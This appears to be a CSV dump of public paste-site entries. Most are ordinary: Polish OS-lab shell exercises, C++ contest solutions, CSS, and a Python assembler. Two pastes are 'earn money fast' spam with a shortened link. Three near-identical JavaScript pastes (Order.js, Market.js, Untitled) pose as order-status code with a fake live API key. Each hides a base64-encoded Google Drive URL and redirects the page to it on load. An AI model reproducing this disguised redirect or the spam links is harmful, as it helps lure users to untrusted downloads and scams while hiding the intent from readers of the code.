id,title,username,language,date,content
mM7WvpAE,EARN $900 INSTANTLY 2025 D0,bgftxc,JavaScript,Friday 4th of April 2025 06:31:23 AM CDT," 
Pdf https://tinyurl.com/paidleaksss


FBeXmkFcGl
"
Bkn8f3Ng,Order.js,iLoveToWatch,JavaScript,Friday 4th of April 2025 06:21:24 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/164/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
TVttC3H7,sysopv2_2.1.5,pan7nikt,Bash,Friday 4th of April 2025 06:20:32 AM CDT,"#2.1.5 
 
#1. Należy wskazać trzy różnice pomiędzy uruchomionym programem skonsolidowanym statycznie i dynamicznie:
#a) w jakiej sytuacji nie może zostać utworzony proces po uruchomieniu programu;
 
#W przypadku programu skonsolidowanego dynamicznie nie może zostać utworzony proces po uruchomieniu programu, ponieważ brakuje biblioteki libsodium.
 
echo -e '\033[0;32m---------2.1.5.1 (A)--------\nProba uruchomiena programu skonsolidowanego dynamicznie bez biblioteki\033[0m'
sudo dnf remove libsodium -yq
ldd prog | grep --color -E ""not found|$""
ldd sprog
./prog 
./sprog
echo -e '\033[0;32mInstalacja brakujacej biblioteki\033[0m'
sudo dnf install libsodium -yq
ldd prog | grep --color -E ""libsodium.so.26 =>|$""
ldd sprog
./prog
./sprog
 
#b) porównanie liczby nieanonimowych segmentów pamięci w mapie pamięci każdego z procesów - wymagane wskazanie nieanonimowego segmentu pamięci zawierającego odpowiednio text/zmienne/stałe;
 
echo -e '\033[0;32m---------2.1.5.1 (B)--------\n Liczba nieanonimowych segmentow pamieci w mapie pamieci (fragmentu pamieci o ciaglej logicznej adresacji pamieci)\033[0m'
#uruchomić w oddzielnych oknach terminala program sprog i prog
pidof prog
pidof sprog
pmap -x $(pidof prog) | grep --color -E ""Mode|Mapping|$""
pmap -x $(pidof sprog) | grep --color -E ""Mode|Mapping|$""
echo -e 'r---- stale\nrw--- zmienne\nr-x-- text\nNieanonimowe bez [anon] i [stack]\n\033[0;32m- Wiecej segmentow nieanonimowych dla procesu utworzonego wskutek uruchomienia programu skonsolidowanego dynamicznie\033[0m\nnieanonimowe segmenty to te, gdzie dane lub tekst wczytane zostaly z pliku wykonywalnego lub zawierajacego biblioteke';
 
#c) korzystając z narzędzia top/htop należy wykazać rozmiar pamięci wirtualnej (ozn. VSZ/VIRT), rozmiar zajmowanej ulotnej pamięci fizycznej (ozn. RSZ/RSS/RES) oraz rozmiar pamięci, która może być potencjalnie współdzielona (ozn. SHR) przez każdy z procesów z innymi procesami.
htop
#F4 aby filtrować (wpisać prog i enter)

   PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND                                 
   8022 root      20   0    2940   1480   1480 S   0,0   0,0   0:00.00 prog                                    
   8444 root      20   0    1380    928    928 S   0,0   0,0   0:00.00 sprog   
 
#VSZ/VIRT prog ma więcej, bo ładuje biblioteki współdzielone (dynamiczne).
#RSZ/RSS/RES większe dla prog, bo załadowane są również fragmenty bibliotek współdzielonych do pamięci fizycznej.
#SHR (Shared memory): Większe w prog, bo dzieli segmenty bibliotek dynamicznych z innymi procesami.
#większe dla prog, bo współdzieli biblioteki dynamiczne (np. glibc, libsodium) z innymi procesami.
 
#Jak dla pliku regularnego zawierającego program wykonywalny lub bibliotekę wspólną ELF określić rodzaj zastosowanej konsolidacji?
 
echo -e '\033[0;32m---------2.1.5.1 (D)--------\nOKRESLENIE RODZAJU ZASTOSOWANEJ KONSOLIDACJI\033[0m\n\033[0;32mdla biblioteki\033[0m'
file /usr/lib64/libc.so.6 | grep --color -E ""dynamically linked|$""
echo -e '\033[0;32mdla programu dynamicznie skonsolidowanego\033[0m'
file prog | grep --color -E ""dynamically linked|$""
echo -e '\033[0;32mdla programu statycznie skonsolidowanego\033[0m'
file sprog | grep --color -E ""statically linked|$""
 
#2. Dla programu oraz biblioteki skonsolidowanej dynamicznie należy wykazać listę wymaganych bibliotek i wykazać listę wszystkich bibliotek zarządzanych przez linker? - każdy uczestnik zajęć wybiera do eksperymentu inny niż pozostali program ELF oraz inną niż pozostali bibliotekę ELF (nie można wybrać programu prog oraz biblioteki libsodium).
#sciezki do programu mozemu szukac poleceniem: which
 
echo -e '\033[0;32m---------2.1.5.2--------\nLista bibliotek wymaganych przez program\033[0m'
ldd /usr/bin/find
echo -e '\033[0;32mi biblioteke skonsolidowana dynamicznie\033[0m'
ldd /usr/lib64/libc.so.6
#ew. ldd libselinux.so.1
echo -e '\033[0;32mIlosc bibliotek w linkerze\033[0m'
ldconfig -p | grep bibliotek
echo -e '\033[0;32mWszystkie biblioteki zarzadzane przez linker\033[0m'
ldconfig -p
 
#3. Wykazać dla uruchomionego programu ELF czas przetwarzania w trybie uprzywilejowanym i czas przetwarzania w trybie nieuprzywilejowanym, dlaczego suma tych czasów nie musi być zgodna z czasem cyklu życia (istnienia) procesu. Skąd pochodzi kod przetwarzany przez proces w trybie uprzywilejowanym, a skąd pochodzi kod przetwarzany przez proces w trybie nieuprzywilejowanym.  W jakiej sytuacji następuje zmiana trybu przetwarzania z nieuprzywilejowanego na uprzywilejowany? 
 
echo -e '\033[0;32m---------2.1.5.3--------\nCzas przetwarzania w trybie nieuprzywilejowanym i uprzywilejowanym\033[0m'
time ls

echo -e '\033[0;32m- Suma tych czasow nie musi byc zgodna, poniewaz proces w trakcie swojego zycia nie musi byc przetwarzany w zadnym trybie (moze np. oczekiwac na input)\n- proces pochodzi\nw uprzywilejowanym: z jadra\nw nieuprzywilejowanym: z programu lub biblioteki.\n- Zmiana nastepuje w momencie zgloszenia wywolania systemowego przez proces (rozkaz pulapki)\033[0m'
 
 
#4. Czym jest wywołanie systemowe i która z bibliotek oferuje procesom możliwość zgłaszania wywołań systemowych? - wykazanie, który z procesów utworzonych w wyniku uruchomienia udostępnionych w zadaniu programów ELF (zakładając identyczny kod źródłowy obu programów wykonywalnych, skonsolidowanych odpowiednio statycznie i dynamicznie) zgłaszał mniej wywołań systemowych.
 
echo -e '\033[0;32m---------2.1.5.4--------\nWywolanie systemowe to rozwiazanie/funkcjonalnosc (procedura obslugi wywolania systemowego), ktore umozliwia procesowi skorzystanie z funkcjonalnosci oferowanych przez jadro\033[0m\nTakie wywolania umozliwia biblioteka \033[0;32mVDSO\033[0m\nFragment kodu uruchamiany po wykonaniu wywolania systemowego to \033[0;32mPROCEDURA\033[0m\n\n\n\033[0;32mPorownanie ilosci zgloszen wywolan systemowych\033[0m'

strace -c ./prog
strace -c ./sprog
 
echo -e '\033[0;32mprog\033[0m miał więcej wywołań systemowych ze względu na dynamiczne ładowanie bibliotek'

#Patrzymy na calls/total
#Z reguły sprog (statyczny) zgłasza mniej wywołań na starcie, bo nie potrzebuje ładowania bibliotek
#prog (dynamiczny) będzie miał więcej wywołań systemowych, przez dynamiczne ładowanie bibliotek
 
#cat /proc/$(pidof prog)/maps | grep vdso   - mozemy udowodnić użycie VDSO"
MZk2a2v8,平方差 参考代码,Dmaxiya,C++,Friday 4th of April 2025 06:19:35 AM CDT,"#include <bits/stdc++.h>
using namespace std;

typedef long long LL;
const int maxn = 100000 + 100;
int num[5] = {2, 6, 10, 14, 18};

int solve(int x) {
    return x - (x / 20 * 5 + (upper_bound(num, num + 5, x % 20) - num));
}

int main() {
#ifdef ExRoc
    freopen(""test.txt"", ""r"", stdin);
#endif  // ExRoc
    ios::sync_with_stdio(false);

//    set<int> st;
//    for (int i = 1; i <= 1000; ++i) {
//        st.insert(i);
//    }
//    for (int i = 0; i <= 10000; ++i) {
//        for (int j = 0; j < i; ++j) {
//            st.erase(i * i - j * j);
//        }
//    }
//    for (int x : st) {
//        cout << x << endl;
//    }

    int l, r;
    cin >> l >> r;
    cout << solve(r) - solve(l - 1) << endl;

    return 0;
}"
aFSX7cTV,Make $1000 15-MINUTES (BEGINNER) RQ,bgftxc,JavaScript,Friday 4th of April 2025 06:15:28 AM CDT," 
Pdf https://tinyurl.com/paidleaksss


WeXMHniqAA
"
q8eA7y1R,Tailwind Body Background Gradient,tommyosheawebdesign,CSS,Friday 4th of April 2025 06:11:31 AM CDT,"<body class = ""bg-gradient-to-t from-[#fbc2eb] to-[#a6c1ee] h-screen"">

</body>"
tFxAuCWH,Market.js,iLoveToWatch,JavaScript,Friday 4th of April 2025 06:06:01 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/849/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
GADdbYAc,dataNone,TestGuy1,JSON,Friday 4th of April 2025 06:00:05 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: 'b7fe5c1eee9bec72b372b0bdec7642752959d900d871e79af0691f1020a46f28d0155f5368b0989ee1abb6e5b313f7ed15759053b5a8f946ec692df47addb7f58ebf0842898a587d40be25d63fa39cbd2183b3167058919aee12acb931db6ac42e89a642b21b6b7312900c5c21d820bc36039d7e38605ed8de008a28825d5c75',
  otherdata: [
    'f6bbd42d07dd0c91ebc2122302b0e521',
    '8975d05fed48c826ef58b3e3e2a6d04a',
    '9b1089453dd2c68579fb4c822ffc7134',
    'a6f80c97bcf2e2e6e861494209eaac1d',
    '738443ee9b91a60b15d189fb5bc02b9c',
    '3631ce1504cdedfda9aefba480668980',
    'fefcf1080d931b0c0137a240fb2fff48',
    'e7e9ac26d0fa117f3c6c87253f0495de'
  ]
}"
VMC9whYG,幸运数 有奖问答 参考代码,Dmaxiya,C++,Friday 4th of April 2025 05:52:46 AM CDT,"#include <bits/stdc++.h>
using namespace std;

typedef long long LL;
const int maxn = 100000 + 100;
int ans;

bool judge(int x) {
    int dig = 0;
    int tmp = x;
    while (tmp != 0) {
        ++dig;
        tmp /= 10;
    }
    if (dig % 2 != 0) {
        return false;
    }
    int sum = 0;
    tmp = x;
    for (int i = 0; i < dig; ++i) {
        if (i < dig / 2) {
            sum += tmp % 10;
        } else {
            sum -= tmp % 10;
        }
        tmp /= 10;
    }
    return sum == 0;
}

LL dp[100][100];

int main() {
#ifdef ExRoc
    freopen(""test.txt"", ""r"", stdin);
#endif  // ExRoc
    ios::sync_with_stdio(false);

//    for (int i = 1; i <= 100000000; ++i) {
//        if (judge(i)) {
//            ++ans;
//        }
//    }
//    cout << ans << endl;
//
//    LL sum = 0;
//    dp[0][0] = 1;
//    for (int i = 1; i <= 30; ++i) {
//        for (int j = 0; j < 10; ++j) {
//            dp[i][0] += dp[i - 1][j];
//        }
//        for (int j = 1; j < 10; ++j) {
//            dp[i][j] = dp[i - 1][j - 1];
//        }
//        sum += dp[i][7];
//    }
//
//    cout << dp[30][7] << endl;
//    cout << sum << endl;

    char pid;
    cin >> pid;
    if(pid == 'A') {
        puts(""4430091"");
    } else {
        puts(""4165637"");
    }

    return 0;
}"
WC9TCayE,Untitled,iLoveToWatch,JavaScript,Friday 4th of April 2025 05:50:38 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/272/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
zFM87MsW,my_code_7,Korotkodul,Python,Friday 4th of April 2025 05:32:16 AM CDT,"import pyparsing as pp


# Улучшенные определения элементов
identifier = pp.Word(pp.alphas, pp.alphanums + ""_"")
mnemonic = pp.oneOf(""mov add sub halt"", caseless=True)  # Список команд
command_name = mnemonic(""command"")

# Числа: #10 или 10 (целые)
number = pp.Combine(pp.Optional('#') + pp.Word(pp.nums))
# Регистры: r0, r1, ..., r15
register = pp.Combine(pp.CaselessLiteral('r') + pp.Word(pp.nums, max=2))
argument = number | register | identifier
arguments = pp.Group(pp.delimitedList(argument, delim=pp.Suppress(',')))(""args"")

label = (identifier + pp.Suppress("":""))(""label"")
comment = (pp.Suppress(';') + pp.restOfLine.setParseAction(lambda t: t[0].strip()))(""comment"")

# Основное правило
rule = (
    pp.Optional(label, default='')
    + pp.Optional(command_name, default='')
    + pp.Optional(arguments, default=[])
    + pp.Optional(comment, default='')
)

debug_mode = True

def parse(s):
    s = s.lower().strip()
    if s[0] == '.':
        s = s.replace("" "", """")
        return {'label': '', 'command_name': 'start_from_address', 'arguments': [ s[2:] ], 'comment': ''}
    parsed = rule.parseString(s, parseAll=True)
    args = []
    if len(parsed.args) != 0:
        args = parsed.args.asList()
    comment = ''
    if parsed.comment  != '':
        comment = parsed.comment[0]
    label = ''
    if  parsed.label != '':
        label = parsed.label[0]
    result = {
        'label': label,
        'command_name': parsed.command if 'command' in parsed else '',
        'arguments': args,
        'comment': comment
    }

    """"""if debug_mode:
        print(""s:"", s)
        #print([parsed.label, parsed.command_name, parsed.arguments, parsed.comment])
        print(""return:"", result)
        print()""""""

    return result


dict_machine_code = {'start': '', 'data': []}

assembler_code = []
filename = 'asm_code.txt'
#filename = 'pdp11_code.txt'
with open(filename, 'r', encoding='utf-8') as file:
    for line in file:
        line = line.lower().strip()
        assembler_code.append(parse(line))

if debug_mode:
    print(""assembler_code"")
    for line in assembler_code:
        print(line)
    print()

opcode = {
    'mov': '0001',
    'add': '0110',
    'halt': '0000'
}

def to3bit(x):
    res = str(bin(int(x))[2:])
    while len(res) < 3:
        res = '0' + res
    return res

#print(to3bit('3'))

def to_four_digit_hex_number(x):
    res = str(hex(int(x)))[2:]
    while len(res) < 4:
        res = '0' + res
    return res

#print(to_four_digit_hex_number('10'))

#для начала считаем, что сначала идёт команда. то есть без label
#считаем, что у нас могут быть только 3 команды: move/add/halt
#у этих 3х команд аргументы - это SSDD
#вырианты: cmd R, R; cmd #, R;

#на случай # у нас есть переменные additional...
def to_raw_machine_code(command):

    if command['command_name'] == 'halt':
        dict_machine_code['data'].append('0' * 16)
        return '0' * 16, ''
    if command['command_name'] == 'start_from_address':
        dict_machine_code['start'] = to_four_digit_hex_number(int(command['arguments'][0], 8))
        return [to_four_digit_hex_number(int(command['arguments'][0], 8)), 'number of bytes in the resulting file']

    command_code = opcode[command['command_name']]

    source = command['arguments'][0]
    source_mode = ''
    source_R_num = ''
    if source[0] == 'r':
        source_mode = '000'
        source_R_num = to3bit(source[1])
    source_additional_word = ''
    if source[0] == '#':
        source_mode = '010'
        source_R_num = '111'
        source_additional_word = to_four_digit_hex_number(source[1:])

    destination = command['arguments'][1]
    destination_mode = ''
    destination_R_num = ''
    if destination[0] == 'r':
        destination_mode = '000'
        destination_R_num = to3bit(destination[1])

    raw_machine_command = command_code + source_mode + source_R_num + destination_mode + destination_R_num
    dict_machine_code['data'].append(raw_machine_command)
    if source_additional_word != '':
        dict_machine_code['data'].append(source_additional_word)
    return raw_machine_command, source_additional_word

raw_machine_code = []
for cmd in assembler_code:
    raw_machine_code.append(to_raw_machine_code(cmd))

print(""raw_machine_code"",  raw_machine_code)

machine_code = []
def to_machine_code(raw_machine_command):
    #print(""raw_machine_command"", raw_machine_command)
    if len(raw_machine_command[0]) != 16:
        return raw_machine_command

    raw_command_code = raw_machine_command[0]
    piece1 = raw_command_code[:4]
    piece2 = raw_command_code[4:8]
    piece3 = raw_command_code[8:12]
    piece4 = raw_command_code[12:]
    #print(""pieces"", piece1, piece2, piece3, piece4)
    num1 = hex(int(piece1,  2))[2:] + hex(int(piece2, 2))[2:]
    num2 = hex(int(piece3,  2))[2:] + hex(int(piece4, 2))[2:]
    machine_command = [num2, num1]

    additional_num1 = ''
    additional_num2 = ''
    if len(raw_machine_command[1]) == 4:
        additional_num1 = raw_machine_command[1][:2]
        additional_num2 = raw_machine_command[1][2:]
        machine_command.append(additional_num2)
        machine_command.append(additional_num1)

    return machine_command



for cmd in raw_machine_code:
    cmd = to_machine_code(cmd)
    machine_code.append(cmd)

print(""machine_code:"", machine_code)
print(""dict_machine_code:"", dict_machine_code)

with open(""machine_code.txt"", ""w"", encoding=""utf-8"") as file:
    for cmd in machine_code:
        for line in cmd:
            file.write(line + ""\n"")



print(""Файл успешно создан и записан."")

"
